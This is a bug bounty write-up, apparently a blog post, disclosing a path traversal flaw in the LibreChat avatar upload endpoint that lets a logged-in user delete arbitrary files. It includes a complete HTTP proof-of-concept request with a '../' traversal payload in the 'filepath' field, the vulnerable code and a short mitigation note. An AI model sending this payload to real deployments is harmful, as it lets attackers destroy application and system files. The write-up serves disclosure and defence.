---
layout: post
title: {% raw %}[Duplicate]{% endraw %} Path Traversal that leads to remove other files with node permission in danny-avila/librechat
description: BugBounty Write-up
tags: huntr bugbounty path-traversal      
category: bugbounty 
---   
      
 I reported path traversal vulnerability in danny-avila/librechat to the huntr bugbounty platform. 
  
# 📜 Description     
    
A path traversal attack (also known as directory traversal) is a security vulnerability that allows attackers to manipulate file or directory paths in order to access unintended files or directories outside the intended folder structure. When a web application provides insufficient validation or sanitization of user inputs, attackers can exploit this weakness by crafting requests that traverse directories to access sensitive system files or perform unauthorized actions like deleting files.  
         
# 🕵️ Proof of Concept    

I created the file in /app/test/hacked for testing if the file removes or not. The file had the permission of node.     
     
```http
POST /api/agents/avatar/asdf HTTP/1.1
Host: localhost:3080
Content-Length: 10352
sec-ch-ua-platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3MGZhNWE1YTcyY2QwNjZmMzQxYjcwZCIsInVzZXJuYW1lIjoiYWFhYWEiLCJwcm92aWRlciI6ImxvY2FsIiwiZW1haWwiOiJhYWFhYUBuYXZlci5jb20iLCJpYXQiOjE3MjkxMzgzNzcsImV4cCI6MTcyOTEzOTI3N30.Drs4845G6BvwlTsbPmIU97COOEpUYnb1QPNDxczl77c
Accept-Language: ko-KR,ko;q=0.9
sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqD8OKhALyMzAPlIU
Origin: http://localhost:3080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3080/c/new
Accept-Encoding: gzip, deflate, br
Cookie: refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3MGZhNWE1YTcyY2QwNjZmMzQxYjcwZCIsImlhdCI6MTcyOTEzODM3NywiZXhwIjoxNzI5Njk4NjI0fQ.QnMNZfYNdC-kKdfjxeOWihbiF053uWNiPPsnWJU75m0
Connection: keep-alive

------WebKitFormBoundaryqD8OKhALyMzAPlIU
Content-Disposition: form-data; name="file"; filename="avatar.png"
Content-Type: image/png

PNG Binary
------WebKitFormBoundaryqD8OKhALyMzAPlIU
Content-Disposition: form-data; name="avatar"

{
    "source":"local",
    "filepath":"/uploads/670fa5a5a72cd066f341b70d/../../../../../../../../app/test/hacked"
}
------WebKitFormBoundaryqD8OKhALyMzAPlIU--
```     
     
This problem occurs in /api/server/services/Files/Local/crud.js. It's because there is no verification logic for the path.    
    
```javascript
if (file.filepath.startsWith(`/uploads/${req.user.id}`)) {
    const basePath = file.filepath.split('/uploads/')[1];
    const filepath = path.join(uploads, basePath);
    await fs.promises.unlink(filepath);
    return;
}
```    
          
## Test Code    
     
```javascript
const path = require('path');

const basePath = "/uploads/670fa5a5a72cd066f341b70d/../../../../../../../../app/test/hacked".split("/uploads/")[1];
console.log(basePath);
console.log(path.join("/uploads/", basePath)); // OUTPUT: /app/test/hacked
```

# 🔐 Mitigations    
     
you can use the regex function to extract the last element of path or check the path if the dot includes in path.          
     
# 📚 References      
- ![OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) 
- ![PortSwigger - Path Traversal](https://portswigger.net/web-security/file-path-traversal)     
      
# Impact
An attacker could perform actions not intended by application like delete arbitrary files on file system including application source code or configuration and critical system files.         